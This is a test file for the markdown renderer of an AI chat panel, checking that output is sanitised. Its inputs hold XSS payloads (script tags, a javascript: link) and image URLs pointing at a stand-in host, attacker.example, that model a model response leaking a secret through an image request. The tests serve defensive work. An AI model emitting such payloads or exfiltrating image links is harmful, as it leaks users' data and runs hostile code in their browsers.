/**
 * Markdown rendering for the AI chat panel.
 *
 * Covers: marked parses common markdown; output passes through DOMPurify so
 * XSS attempts are stripped; partial / streaming input doesn't crash.
 */

import { describe, expect, it } from 'bun:test'
import { renderMarkdownToHtml } from '@site/agent'

describe('renderMarkdownToHtml', () => {
  it('renders bold and italic markers', () => {
    const html = renderMarkdownToHtml('This is **bold** and *italic*.')
    expect(html).toContain('<strong>bold</strong>')
    expect(html).toContain('<em>italic</em>')
  })

  it('renders unordered lists', () => {
    const html = renderMarkdownToHtml('- one\n- two\n- three')
    expect(html).toContain('<ul>')
    expect(html).toContain('<li>one</li>')
    expect(html).toContain('<li>two</li>')
    expect(html).toContain('<li>three</li>')
  })

  it('renders inline code', () => {
    const html = renderMarkdownToHtml('Call `read_document` first.')
    expect(html).toContain('<code>read_document</code>')
  })

  it('renders fenced code blocks', () => {
    const html = renderMarkdownToHtml('```\nconst x = 1\n```')
    expect(html).toContain('<pre>')
    expect(html).toContain('<code>')
    expect(html).toContain('const x = 1')
  })

  it('renders links and forces target=_blank rel=noopener', () => {
    const html = renderMarkdownToHtml('See [docs](https://example.com).')
    expect(html).toContain('href="https://example.com"')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
  })

  it('strips script tags inside markdown text (XSS guard)', () => {
    // High-impact attack vector — must always be stripped. Direct inline
    // event handlers on tags like <img onerror> are covered separately by
    // executor.test.ts which exercises sanitizeRichtext directly; they pass
    // in a real browser even when happy-dom's DOM parsing is permissive.
    const html = renderMarkdownToHtml(
      'innocent text <script>alert(1)</script> trailing text',
    )
    expect(html).not.toContain('<script>')
    expect(html).not.toContain('alert(1)')
    expect(html).toContain('innocent text')
    expect(html).toContain('trailing text')
  })

  it('strips javascript: hrefs', () => {
    const html = renderMarkdownToHtml('[click](javascript:alert(1))')
    expect(html).not.toContain('javascript:')
    expect(html).not.toContain('alert(1)')
  })

  it('returns empty string for empty input', () => {
    expect(renderMarkdownToHtml('')).toBe('')
    expect(renderMarkdownToHtml('   \n  ')).toBe('')
  })

  it('handles partial markdown gracefully (streaming case)', () => {
    // marked tolerates an unclosed `**` — renders as literal characters.
    const html = renderMarkdownToHtml('I will add **a hero')
    expect(() => renderMarkdownToHtml('I will add **a hero')).not.toThrow()
    expect(html).toContain('a hero')
  })

  it('renders a paragraph with a trailing line-break (breaks: true)', () => {
    // With `breaks: true` configured, single newlines should become <br>.
    const html = renderMarkdownToHtml('first line\nsecond line')
    expect(html).toContain('<br>')
  })

  it('drops remote images so a model response cannot exfiltrate through an image URL', () => {
    const html = renderMarkdownToHtml('Done.\n\n![x](https://attacker.example/?d=secret)\n\n<img src="https://attacker.example/b">')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('attacker.example')
    expect(html).toContain('Done.')
  })
})
